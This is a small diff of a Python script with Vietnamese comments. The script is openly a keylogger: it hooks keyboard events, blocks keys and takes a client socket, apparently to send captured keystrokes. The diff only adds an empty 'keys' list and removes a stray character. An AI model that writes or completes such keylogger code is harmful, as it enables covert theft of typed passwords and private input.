@@ -1,5 +1,7 @@
 import keyboard
 
+keys = []
+
 def block_all_keys():
     """Khóa tất cả các phím trong danh sách."""
     for key in normal_keys:
@@ -28,8 +30,6 @@ def start_keylogger(client_socket):
     keyboard.hook(on_key_event)
     print("Keylogger is running. Press 'Esc' to stop.")
     keyboard.wait('esc')  # Chờ cho đến khi có sự kiện Esc được nhấn
-
-m
 
 # Đặt danh sách các phím hợp lệ
 normal_keys = [
